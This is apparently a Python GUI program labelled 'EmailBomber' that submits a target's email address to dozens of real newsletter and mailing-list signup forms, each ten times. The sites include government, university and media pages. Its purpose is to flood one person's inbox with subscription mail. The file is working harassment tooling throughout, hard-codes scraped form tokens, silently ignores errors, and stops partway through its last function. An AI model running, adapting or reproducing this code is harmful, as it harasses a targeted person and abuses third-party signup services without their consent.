'''MADE BY VENAM'''
import wx
from wx.lib.anchors import LayoutAnchors
from wx.lib.pubsub import Publisher
import datetime
import time
import mechanize
import threading

##############function for xw################
def create(parent):
    return EmailBomber(parent)
##################################


############generate a browser########################
def createbrowser(website,post):
    br = mechanize.Browser()
    br.set_handle_gzip(True)
    br.set_handle_robots(False)
    br.set_handle_redirect(True)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3')]
    br.open(website,post)
    return br
###################################################33


############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################


#######################begin hell of functions###########################
def orasco(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.orascomci.com/index.php?f=subscribeProcess&newsAlerts=y&announcementAlerts=y&forename=crote&surname=banane&email='+email.replace('@','%40'),'nothing')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.orascomci.com/index.php?id=subscribe ")
            wx.MutexGuiLeave()
        except:
            pass

def pint(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://info.pinpointe.com/subscribe-email-marketing-newsletter/','-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="__VIEWSTATE"\r\n\r\n/wEPDwUKLTU4NDA3NTcxOWQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFFWRubjpJTkdFTklNRU5VMTpfY3RsMKlmdIv3WVDyPX4CFemBotxudOeq\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="dnn:INGENIMENU1:_ctl0"\r\n\r\n\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856submitter_user_token"\r\n\r\n1a8bea8201376039199b9dea8daca067\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="ContactFormId"\r\n\r\n50741\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856spam_check_key"\r\n\r\noosjpqggnnqpoomfierdsfdndjmrjipmikmppmidvrdfgvudlctgmiepofoe\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856spam_check_sig"\r\n\r\n124124128119125126116116123123126125124124122115118114127113128115113123113119122127119118125122118120122125125122118113131127113115116131130113121112129116122118114125124115124114\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856:Email"\r\n\r\n'+email+'\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856:FirstName"\r\n\r\nroberto\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856:Company"\r\n\r\ngonzalescompany\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_50741_m605856:Field_Text_10"\r\n\r\nSubscribe-Newsletter\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="LeadGen_ContactForm_Submit_LeadGen_ContactForm_50741_m605856"\r\n\r\nSUBSCRIBE TODAY\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="ScrollTop"\r\n\r\n\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="__dnnVariable"\r\n\r\n\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="hsFirstVisitHidden"\r\n\r\nhttp://info.pinpointe.com/subscribe-email-marketing-newsletter/||2012-06-19 12%3A51%3A29\r\n-----------------------------5853210051013233996995644022\r\nContent-Disposition: form-data; name="hsUserToken"\r\n\r\n1a8bea8201376039199b9dea8daca067\r\n-----------------------------5853210051013233996995644022--\r\n')
            wx.MutexGuiEnter()

            Publisher().sendMessage("update",  "New Email Sent with http://info.pinpointe.com/subscribe-email-marketing-newsletter/")

            wx.MutexGuiLeave()
        except:
            pass

def cofe(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.denniscoffey-thealbum.com/Re-Worked/confirm.php', 'newsletter='+email.replace('@','%40')+'&Submit+Email=Submit')

            wx.MutexGuiEnter()

            Publisher().sendMessage("update",  "New Email Sent with http://www.denniscoffey-thealbum.com/Re-Worked/index.html")
            wx.MutexGuiLeave()
        except:
            pass
def steve(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://subscribe.wordpress.com/', 'email='+email.replace('@','%40')+'&action=subscribe&blog_id=6599589&source=http%3A%2F%2Fsteveblank.com%2Fabout%2F&sub-type=widget&redirect_fragment=blog_subscription-3&_wpnonce=fac6650853')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://steveblank.com/about/")
            wx.MutexGuiLeave()
        except:
            pass


def tattoo(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.tattoomike.com/mailinglist/public/index.php','email='+email.replace('@','%40')+'&action=sub&Submit=Submit')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.tattoomike.com/mailinglist/public/index.php")

            wx.MutexGuiLeave()
        except:
            pass

def proxy(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://groups.google.com/group/topproxylist-net/boxsubscribe?hl=en-GB&email='+email.replace('@','%40')+'&sub=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.topproxylist.net/subscribe.php#.T4GcjJ_k4xB")
            wx.MutexGuiLeave()
        except:
            pass

def tips(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://addictivetips.us2.list-manage.com/subscribe/post?u=a0e21543bae1f9b21c5b0dd53&id=e520040b66','EMAIL='+email.replace('@','%40')+'&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.addictivetips.com/mobile/enter-your-email-address-with-two-quick-taps-on-key-ios/")
            wx.MutexGuiLeave()
        except:
            pass
def dora(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://ci.mount-dora.fl.us/index.asp?type=DYNAFORM&sec={740FAD40-A0E1-483A-99C7-245CC47F1D71}&page=process&EmailField=df42845&HasEmail=1','df42843=rene&df42844=dumond&df42845='+email.replace('@','%40')+'&df42855=&df42857=&df42858=+&df42859=&df42856=&dfVolList=6575&dfVolList=4414&dfVolList=4404&dfVolList=6576&dfVolList=4403&dfVolList=4430&dfVolList=4402&dfVolList=6574&site_id=%7BB57363BB-8A05-49A7-AE31-DBFCAAA4A5EF%7D&contactemail=')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://ci.mount-dora.fl.us/index.asp?Type=DYNAFORM&SEC={740FAD40-A0E1-483A-99C7-245CC47F1D71}")
            wx.MutexGuiLeave()
        except:
            pass


def nin(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://dl.nin.com/theslip/signup','email='+email.replace('@','%40')+'&confirm_email='+email.replace('@','%40')+'&submit.x=73&submit.y=20&part_id=209')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://dl.nin.com/theslip/signup")
            wx.MutexGuiLeave()
        except:
            pass
def eib(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.eib.org/form','formpath=%2Feib.org%2Finfocentre%2Fnewsletters%2Fsubscribe&email='+email.replace('@','%40')+'&mailingList=eib-newsletter&letters=')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.eib.org/infocentre/newsletters/subscribe.htm ")
            wx.MutexGuiLeave()
        except:
            pass
def mailman(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://mailman2.u.washington.edu/mailman/subscribe/plone_seattle','email='+email.replace('@','%40')+'&fullname=&digest=1&email-button=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with https://mailman2.u.washington.edu/mailman/listinfo/plone_seattle")
            wx.MutexGuiLeave()
        except:
            pass
def art(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://listserver.alabama.gov/subscribe/subscribe.tml','email='+email.replace('@','%40')+'&subscribe.x=29&subscribe.y=13&name=&list=arts_news&confirm=one&showconfirm=T')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.arts.state.al.us/emailsubcribe.htm ")
            wx.MutexGuiLeave()
        except:
            pass
def designf(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://thedesignfiles.us2.list-manage.com/subscribe/post?u=580d33b9c5a6ca68ab3f00420&id=00cc0b90f9','EMAIL='+email.replace('@','%40')+'&group=1&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://thedesignfiles.net/subscribe-via-email/ ")
            wx.MutexGuiLeave()
        except:
            pass

def wiliam(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://mathgradblog.williams.edu/subscribe-ams-grad-blog-email/','email='+email.replace('@','%40')+'&action=subscribe&source=http%3A%2F%2Fmathgradblog.williams.edu%2Fsubscribe-ams-grad-blog-email%2F&sub-type=widget&redirect_fragment=blog_subscription-4&_wpnonce=e10372d79d&jetpack_subscriptions_widget=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://mathgradblog.williams.edu/subscribe-ams-grad-blog-email/")
            wx.MutexGuiLeave()
        except:
            pass

def infacta(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.infacta.com/customers/secure/optin/optin.aspx?fid=14102&fname=john&email='+email+'&fm=FUCKYOUALOT','nothing')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with www.infacta.com/customers/")
            wx.MutexGuiLeave()
        except:
            pass
def wagov(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://listserv.wa.gov/cgi-bin/wa?SUBED2=SHARP-LNI-E-CARD&A=1&t=&p=john&s='+email+'&b=Subscribe','nothing')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://listserv.wa.gov/cgi-bin/")
            wx.MutexGuiLeave()
        except:
            pass
def bbc(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.bbc.co.uk/cgi-bin/cgiemail/newstalk/this_week/subscribe.txt?email_from=' + email,'nothing')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://news.bbc.co.uk/2/hi/programmes/this_week/7595877.stm")
            wx.MutexGuiLeave()
        except:
            pass
def uki(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.coe.uky.edu/cgi-bin/subscribe.pl?__SUB_NAME=joh&__SUB_EMAIL='+email+'&__SUB_LISTNAME=fuckyou')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.coe.uky.edu/cgi-bin/subscribe.pl")
            wx.MutexGuiLeave()
        except:
            pass
def HMT(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://groups.google.com/group/hmtrad/boxsubscribe?email='+email.replace('@','%40')+'&sub=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.hmtrad.com/HMT/mailinglist.html")
            wx.MutexGuiLeave()
        except:
            pass

def edge(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://sand.lyris.net/subscribe/sbscribe.tml','email='+email.replace('@','%40')+'&subscribe.x=40&subscribe.y=16&name=roberto&country=&list=edge_editions&demographics=country&name_required=T&confirm=one&showconfirm=T&url=http%3A%2F%2Fwww.edge.org%2Fsubscribe2.html')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.edge.org/subscribe.html")
            wx.MutexGuiLeave()
        except:
            pass
def frb(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.frbservices.org/HomePage/app/Subs','FullName=somerandil&EmailAdd='+email.replace('@','%40')+'&htmltext=HTML&account=Accounting&cash=Cash&ach=ACH&treas=Treasury&check=Check&whole=Fedwire&Fedline=Fedline&Alltop=ALL&opt1=SUBSCRIBE')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.frbservices.org/HomePage/app/alertsubscribe.jsp")
            wx.MutexGuiLeave()
        except:
            pass
def ars(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.ars.usda.gov/elists/elists.htm','listname=arsjobs&emailaddr='+email.replace('@','%40')+'&action=subscribe&headerpath=%2Fhandf%2Fjobs_head.htm&footerpath=%2Fhandf%2Fjobs_foot.htm&confirmreq=true')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.ars.usda.gov/careers/docs.htm?docid=1358")
            wx.MutexGuiLeave()
        except:
            pass
def nie(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://niemanlab.us1.list-manage.com/subscribe/post?u=dc756b20ebb9521ec3ad95e4a&id=d68264fd5e','EMAIL='+email.replace('@','%40')+'&FNAME=roberto&LNAME=gonzales&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.niemanlab.org/subscribe/")
            wx.MutexGuiLeave()
        except:
            pass
def flori(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://flems.doh.state.fl.us/mailman/subscribe/radiation','email='+email.replace('@','%40')+'&digest=0&email-button=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.myfloridaeh.com/radiation/Subscribe.htm")
            wx.MutexGuiLeave()
        except:
            pass

def pirate(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://classic-pirates.us2.list-manage.com/subscribe/post-json?u=04c4e76b4275cf189013e9c87&id=3d79983358&c=jsonp1340136072474&FNAME=johny&EMAIL='+email.replace('@','%40')+'&subscribe=Subscribe&_=1340136091170')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.classic-pirates.com/subscribe")
            wx.MutexGuiLeave()
        except:
            pass
def heroic(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.heroicstories.org/cgi-bin/subber.pl?emailsub='+email)

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.heroicstories.org/subscribe.html")
            wx.MutexGuiLeave()
        except:
            pass

def garden(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.centralparkgardens.org/volunteer/subscribe-to-our-volunteer-email-list','subemail='+email.replace('@','%40')+'&realname=roberto&form.button.subscribe=Subscribe&subscribe=1&form.submitted=1')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.centralparkgardens.org/volunteer")
            wx.MutexGuiLeave()
        except:
            pass
def lost(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://lostworlds.us1.list-manage1.com/subscribe/post?u=dc954b22844a6d6dd56d13a9c&id=acfc4888c8','EMAIL='+email.replace('@','%40')+'&FNAME=roberto&LNAME=&MMERGE3%5Baddr1%5D=&MMERGE3%5Baddr2%5D=&MMERGE3%5Bcity%5D=&MMERGE3%5Bstate%5D=&MMERGE3%5Bzip%5D=&MMERGE3%5Bcountry%5D=164&EMAILTYPE=html&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://lostworlds.org/subscribe/")
            wx.MutexGuiLeave()
        except:
            pass

def SAS(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://support.sas.com/bin/ext_formmail/tsnewssub','required_fields=email%2Cfirstname%2Clastname%2Caction&fields=email%2Cfirstname%2Clastname%2Caction%2Cindex%2Crefcard%2Chelp%2Clists%2Cconfirm%2Cquery%2Cfile1%2Ctype1%2Cfile2%2Ctype2%2Cfile3%2Ctype3%2Cfile4%2Ctype4%2Cfile5%2Ctype5%2Cfile6%2Ctype6&email='+email.replace('@','%40')+'&firstname=roberto&lastname=gonzales&action=subscribe&index=index&refcard=refcard&help=help&confirm=confirm&query=query&file1=&type1=&file2=&type2=&file3=&type3=&file4=&type4=&file5=&type5=&file6=&type6=&Submit=Submit')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://support.sas.com/techsup/news/tsnews.html")
            wx.MutexGuiLeave()
        except:
            pass
def burk(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://berkeley.us1.list-manage1.com/subscribe/post?u=646f20d1372fb21b168a9f006&id=89122b13b6','EMAIL='+email.replace('@','%40')+'&group%5B5%5D%5B1%5D=1&EMAILTYPE=html&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://blogs.berkeley.edu/subscribe-by-email/")
            wx.MutexGuiLeave()
        except:
            pass


def warwick(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://warwick.us2.list-manage.com/subscribe/post-json?u=cf388441cb13f20b1a37be828&id=6bec77df16&c=jsonp1340136732475&EMAIL='+email.replace('@','%40')+'&FNAME=roberto&LNAME=&MMERGE3=Student&EMAILTYPE=html&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www2.warwick.ac.uk/knowledge/about/emails/subscription/")
            wx.MutexGuiLeave()
        except:
            pass
def marine(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.marine.ie/CMSWeb/Forms/Subscribe.aspx?NRMODE=Published&NRNODEGUID=%7bF957D044-392B-4E97-85F3-970783B0BBB3%7d&NRORIGINALURL=%2fhome%2faboutus%2fPressSubscribe%2ehtm&NRCACHEHINT=Guest','__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=dDw3Mjc0MjQxNzI7dDw7bDxpPDE%2BO2k8Mz47PjtsPHQ8O2w8aTwwPjs%2BO2w8dDxAPG1haW4uY3NzOz47Oz47Pj47dDw7bDxpPDE%2BO2k8Mz47aTw1PjtpPDk%2BO2k8MTE%2BO2k8MTM%2BO2k8MTU%2BO2k8MjE%2BO2k8MjU%2BOz47bDx0PDtsPGk8OT47PjtsPHQ8cDxwPGw8VmlzaWJsZTs%2BO2w8bzxmPjs%2BPjs%2BOzs%2BOz4%2BO3Q8cDxwPGw8VGV4dDs%2BO2w8RW1haWwgbm90aWZpY2F0aW9uIG9mIFByZXNzIFJlbGVhc2VzIGFuZCBOZXdzIEl0ZW1zOz4%2BOz47Oz47dDxwPHA8bDxUZXh0Oz47bDxTdWJzY3JpYmUgdG8gYSBmcmVlIGVtYWlsIG5vdGlmaWNhdGlvbiBhbmQgYmUgYWxlcnRlZCB3aGVuZXZlciBhIG5ldyBwcmVzcyByZWxlYXNlIG9yIG5ld3MgaXRlbSBpcyBwdWJsaXNoZWQuIFNpbXBseSBlbnRlciB5b3VyIGVtYWlsIGFkZHJlc3MgYmVsb3csIGNob29zZSB3aGljaCB0eXBlcyBvZiANCgkJCQkJCQlub3RpZmljYXRpb25zIHlvdSBhcmUgaW50ZXJlc3RlZCBpbiwgYW5kIGNsaWNrIHN1YnNjcmliZS4gQSBjb25maXJtYXRpb24gZW1haWwgd2lsbCBiZSANCgkJCQkJCQlzZW50IHRvIHlvdXIgYWRkcmVzcyBiZWZvcmUgdGhlIHN1YnNjcmlwdGlvbiB0YWtlcyBlZmZlY3QuOz4%2BOz47Oz47dDw7bDxpPDE%2BOz47bDx0PHA8cDxsPFRleHQ7PjtsPFNlbGVjdCBFbWFpbCBGb3JtYXQ6IDs%2BPjs%2BOzs%2BOz4%2BO3Q8cDxwPGw8VmlzaWJsZTs%2BO2w8bzxmPjs%2BPjs%2BOzs%2BO3Q8cDxwPGw8VmlzaWJsZTs%2BO2w8bzxmPjs%2BPjs%2BOzs%2BO3Q8cDxwPGw8VmlzaWJsZTs%2BO2w8bzxmPjs%2BPjs%2BOzs%2BO3Q8cDxsPFRleHQ7PjtsPFw8YSB0aXRsZT0nU3Vic2NyaWJlIFRvIFNlYSBDaGFuZ2UgTmV3cycgaHJlZj0naHR0cDovL3d3dy5tYXJpbmUuaWUvaG9tZS9yZXNlYXJjaC9TZWFDaGFuZ2VFbWFpbC5odG0nXD5TdWJzY3JpYmUgVG8gU2VhIENoYW5nZSBOZXdzXDwvYVw%2BOz4%2BOzs%2BO3Q8cDxwPGw8VmlzaWJsZTs%2BO2w8bzxmPjs%2BPjs%2BOzs%2BOz4%2BOz4%2BO2w8cmJFbWFpbFR4dDtyYkVtYWlsVHh0O3JiRW1haWxIVE1MO2Noa1ByZXNzO2Noa05ld3M7Y2hrRU5ld3M7Y2hrVkNOWTtjaGtWQ1NNZ3I7Y2hrVkNUTGRyO2Noa1ZDU1RjaDtjaGtWQ0xhc3Q7Y2hrVkNBZG1uO2Noa1ZDSXRjaDtjaGtWQ1Njb2w7Pj6I1CiUthZ9Rxd08WdV3EvzVTeF%2FA%3D%3D&TopBanner1%3ASearchEntry1%3Asearchfield=&txtEmail='+email.replace('@','%40')+'&btnNew=Subscribe&rbgEmailFormat=rbEmailHTML&chkPress=PRES&chkNews=NEWS&chkENews=ENWS&chkVCNY=VCNY&chkVCSMgr=VCNY-SMGR&chkVCTLdr=VCNY-TLDR&chkVCSTch=VCNY-STCH&chkVCLast=VCNY-LAST&chkVCAdmn=VCNY-ADMN&chkVCItch=VCNY-ITCH&chkVCScol=VCNY-SCOL')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.marine.ie/home/aboutus/PressSubscribe.htm")
            wx.MutexGuiLeave()
        except:
            pass
def soleil(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://alunajoy.com/maillist/?p=subscribe','email='+email.replace('@','%40')+'&emailconfirm='+email.replace('@','%40')+'&htmlemail=1&attribute1=roberto&attribute2=gonzales&attribute3=someemailhere%40hotmail.com&attribute4=kensas&attribute5=kentuchy&attribute6=25354&attribute7=usa&list%5B4%5D=signup&listname%5B4%5D=Center+of+the+SUN+%7E+Newsletter&subscribe=Subscribe+to+free+Center+of+the+Sun+newsletter+here%21')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://alunajoy.com/maillist/?p=subscribe")
            wx.MutexGuiLeave()
        except:
            pass

def council(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://listserver.afsc.noaa.gov/subscribe/subscribe.tml','name=roberto&email='+email.replace('@','%40')+'&list=pfmc_news&name_required=T&confirm=one&showconfirm=T&submit=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.pcouncil.org/currents/sign-up-for-newsletter-and-mailing-lists/")
            wx.MutexGuiLeave()
        except:
            pass
def timedate(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.timeanddate.com/newsletter/newsletter.php?js=1&email='+email+'&firstName=&lastName=&subscribe=1')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.timeanddate.com/newsletter/subscribe.html")
            wx.MutexGuiLeave()
        except:
            pass
def google(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://groups.google.com/group/brandonbirding/boxsubscribe?p=ConfirmExplanation&email='+email+'&_referer=http://www.brandonbirding.co.uk/subscribe.asp')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.brandonbirding.co.uk/subscribe.asp")
            wx.MutexGuiLeave()
        except:
            pass
def OCC(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://comptroller.lyris.net/subscribe/subscribe.tml','email='+email.replace('@','%40')+'&subscribe.x=42&subscribe.y=7&name=&list=occ-consumer-advisories&confirm=one&showconfirm=F&url=http%3A%2F%2Fwww.helpwithmybank.gov%2Fsubscribe%2Fsubscribe.html')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.helpwithmybank.gov/subscribe/index-hwmb-subscribe.html")
            wx.MutexGuiLeave()
        except:
            pass
def revenue(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://lists.wi.gov/subscribe/subscribe.tml','list=doradministrativerules&list=dorasr&list=dorjobs&list=dordistchg&list=dor-exciseefiledev&list=dorlibraries&list=dormanuf&list=dor-mefbusiness&list=dor-mefindividual&list=dor-motorfuelefiledev&list=dormuniclerk&list=dormunitreas&list=dorsales&list=dor-salesefiledev&list=dornews&list=dor-telecommunications&list=dortid&list=dorutility&list=dorresearch&list=dorwitholdingtax&list=dor-withefiledev&email='+email.replace('@','%40')+'&subscribe.x=7&subscribe.y=7&confirm=all&showconfirm=F&url=http%3A%2F%2Fwww.revenue.wi.gov%2Fhtml%2Flistcon.html')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.revenue.wi.gov/html/lists.html")
            wx.MutexGuiLeave()
        except:
            pass
def royal(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://db.rsnz.org/4DCGI','email='+email.replace('@','%40')+'&Name=&subaction=subscribe&List=rsnz-list&List=scienceteacher-announce&List=scitech-talk&List=scitech-announce&List=sciteach-talk&List=socsci-announce&List=manawatu-announce&List=socialscience-talk&List=sustainable-talk&List=science-talk&List=energy-talk&List=genebio-talk&List=health-talk&List=landwaterair-talk&List=mathphyschem-talk&List=nanotech-talk&List=space-talk&List=xenotrans-talk&Action=PublicLists')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.royalsociety.org.nz/news/subscribe/")
            wx.MutexGuiLeave()
        except:
            pass
def com(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://dzogchencommunity.us2.list-manage.com/subscribe/post-json?u=9c501351a1f64244f3a5df4b6&id=9755ae87f4&c=jsonp1340137598292&EMAIL='+email.replace('@','%40')+'&subscribe=Subscribe&_=1340137610157')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://dzogchencommunity.org/contact/subscribe-email-list.html")
            wx.MutexGuiLeave()
        except:
            pass
def socialist(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://socialistworker.org/subscribe/email','email='+email.replace('@','%40')+'&operation=1&op=Submit&form_id=sw_email_sub_form')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://socialistworker.org/subscribe/email")
            wx.MutexGuiLeave()
        except:
            pass
def windows(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.win7news.net/Subscribe/','email='+email.replace('@','%40')+'&subscribe=Subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.win7news.net/Subscribe/")
            wx.MutexGuiLeave()
        except:
            pass
def toronto(email):
    for a in xrange(10):
        try:
            br = createbrowser('https://secure.toronto.ca/MailSubscriber/subscribe.do','action=Subscribe&action2=subscribe&email='+email.replace('@','%40')+'&Subscribe=Subscribe&mailinglist=NEWS-RELEASES&mailinglist=CITY-UPDATE&mailinglist=ROAD-CLOSURE-UPDATES&mailinglist=EMERGENCY-ALERTS&mailinglist=CELEBRATETORONTO&mailinglist=LIVE-GREEN-TORONTO&mailinglist=BEYOURBESTSELF&mailinglist=CYCLOMETER&mailinglist=PEDOMETER&mailinglist=ALLEN-RD-STUDY&mailinglist=ABTP-ICMC&mailinglist=ABTP-NLC&mailinglist=DUNDAS-W&mailinglist=FRONT-ST-AT-UNION&mailinglist=JOHN-ST&mailinglist=OFFICIAL-PLAN-REVIEW&mailinglist=ST-LAWRENCE-MARKET-NORTH&mailinglist=WATERFRONTSANITARYMASTERPLAN')
            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.toronto.ca/e-updates")
            wx.MutexGuiLeave()
        except:
            pass

def cdc(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.cdc.gov/emailforms/email.do','LineWrap=2048&LookBack=15&RCPT=listserv%40listserv.cdc.gov&refer=http%3A%2F%2Fwww.cdc.gov%2Fsentdev.htm&SMTP=FormMail.cdc.gov&Subject=Subscribe&EmailTemplate=http%3A%2F%2Fwww.cdc.gov%2Fcgi-bin%2Fmailtemp.txt&Name=roberto&From='+email.replace('@','%40')+'&subscribe=subscribe+aclist')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.cdc.gov/subscribe.html")
            wx.MutexGuiLeave()
        except:
            pass
def msha(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.msha.gov/subscriptions/subscribe.aspx','__VIEWSTATE=%2FwEPDwUKMTU2NzY5NjQzOGRk3Mo6vQgpqpf4An%2F8Ohqi8p0kD4k%3D&__EVENTVALIDATION=%2FwEWEwKIsMezCwLBkpHwAwLCi9reAwKtkuWiCgLyg6SkCAKG6%2FumBQKeqrjoBQKWioeHAgLi4tiFDwL6o5vLDwKC3t%2BEAgL2toCGDwLu98PIDwKPxMqPDAL7rJWNAQLj7dbDAQLcqJmQBwKowMaSCgKwgYXcCtbWjB6zQZVbmGAVZNRqPVhdA4w9&emailAddress='+email.replace('@','%40')+'&btnSubmit=Submit+Request&RadioFatals=subscribe&RadioNewsReleases=subscribe&RadioRegs=subscribe&RadioInformation=subscribe')

            wx.MutexGuiEnter()
            Publisher().sendMessage("update",  "New Email Sent with http://www.msha.gov/subscriptions/subscribe.aspx")
            wx.MutexGuiLeave()
        except:
            pass
def hc(email):
    for a in xrange(10):
        try:
            br = createbrowser('http://www.hc-sc.gc.ca/ahc-asc/media/sub-abonn/index-eng.php','recipient=media-subscribe-request%40list.hc-sc.gc.ca&redirect=%2Fahc-asc%2Fmedia%2Fsub-abonn%2Fsub-abonn-eng.php&required=email1%7CYour+e-mail&fields=email1%7CE-mail&subject=Media+News+Service+-+Subscribe&email1='+email.replace('@','%40')+'&submitted=&submit=Subscribe')

            wx.MutexGuiEnter()
